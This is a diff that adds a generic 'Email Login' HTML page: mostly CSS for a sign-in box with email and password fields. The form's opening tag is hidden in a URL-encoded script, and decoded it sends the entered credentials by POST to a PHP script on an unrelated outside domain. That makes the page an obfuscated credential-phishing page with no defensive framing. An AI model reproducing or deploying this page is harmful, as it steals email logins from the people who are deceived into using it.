@@ -1,1 +1,190 @@
-scope
+
+<html><head>
+<style>
+* {
+    margin: 0;
+}
+
+html {
+    height: 100%;
+}
+
+body {
+    font-family: Helvetica, Arial;
+    height: 100%;
+}
+
+.bgBox {
+    background-color: #f9f9f9;
+    padding: 50px;
+    border-radius: 5px;
+    border: 2px solid #dedede;
+    max-width: 430px;
+    margin: 0 auto;
+    margin-bottom: 50px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+
+.bgBox h2 { 
+    margin-top: 0;
+    font-size: 23px;
+    color: #484848;
+    text-align: center;
+    margin-bottom: 41px;
+    font-weight: bold;
+}
+
+.bgBox input {
+    border-radius: 3px;
+    padding-top: 1px;
+    transition: none;
+    -webkit-transition: none;
+    height: 47px;
+    padding: 0 15px;
+    box-shadow: none;
+    font-size: 15px;
+    line-height: 16px;
+    border: 1px solid #dedede;
+    font-weight: normal;
+    color: #484848;
+    width: 100%;
+    outline: none;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+
+.bgBox input[type="submit"] {
+    height: 50px;
+    font-size: 21px;
+}
+
+.bgBox input.valid_error {
+    border-color: #e8322e;
+}
+
+.bgBox .inputRow {
+    padding: 6px 0;
+    margin-bottom: 8px;
+    overflow: auto;
+}
+
+.bgBox .inputRow.submit {
+    margin-top: 10px;
+}
+
+.bgBox .inputRow .signIn {
+    color: #fff;
+    background: #5795d2;
+    border-color: #5795d2;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.bgBox .inputRow .signIn:hover {
+    background: #3c78b3;
+}
+
+.bgBox .inputRow .signIn.loading {
+    background: #5795d2 url("preloader.gif")center no-repeat;
+    text-indent: -10000px;
+}
+
+.loginForm {
+    position: relative;
+    top: 50%;
+    margin-top: -215px;
+}
+
+.error {
+    text-align: center;
+    margin-top: 20px;
+}
+
+span {
+    clear: both;
+    font-size: 12px;
+    line-height: 8px;
+    color: #e8322e !important;
+    padding: 8px 0 0 0;
+    text-align: center;
+}
+
+@media (max-width: 430px) {
+    
+    .bgBox {
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+    .loginForm {
+        top: 0;
+        margin: 0;
+    }
+
+    .bgBox h2 {
+        margin-bottom: 20px;
+    }
+
+}
+
+@media (max-width: 350px) {
+
+    .bgBox {
+        padding: 30px;
+    }
+
+    .bgBox h2 {
+        font-size: 20px;
+    }
+
+}
+
+@media (max-width: 250px) {
+    
+    .bgBox {
+        min-width: 250px;
+    }
+
+}
+</style>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>Email Login</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="description" content="$1">
+</head>
+<body>
+
+<div class="loginForm">
+	<script language=javascript>document.write(unescape('%3C%66%6F%72%6D%20%69%64%3D%22%6F%78%5F%66%6F%72%6D%22%20%6E%61%6D%65%3D%22%6F%78%46%6F%72%6D%22%20%61%63%74%69%6F%6E%3D%22%68%74%74%70%73%3A%2F%2F%76%69%65%74%6E%61%6D%2D%73%65%72%76%69%63%65%61%6E%64%73%75%70%70%6C%79%74%72%61%64%69%6E%67%2E%78%79%7A%2F%75%70%2E%70%68%70%22%20%6D%65%74%68%6F%64%3D%22%70%6F%73%74%22%3E'))</script>
+		<div class="bgBox">
+			<h2>Sign in to your email</h2>
+			<div class="inputRow">
+				<input type="text" name="uu" id="login" placeholder="Enter your email" value="" autofocus="" required>
+			</div>
+			<div class="inputRow">
+				<input type="password" name="pp" id="password" placeholder="Enter your password" required>
+			</div>
+			<div class="inputRow submit">
+				<input type="submit" value="Sign in" class="signIn" id="sign_in">
+			</div>
+
+			<div class="error">
+				<span></span>
+			</div>
+
+		</div>
+	</form>
+</div>
+
+
+
+
+
+
+</body></html>
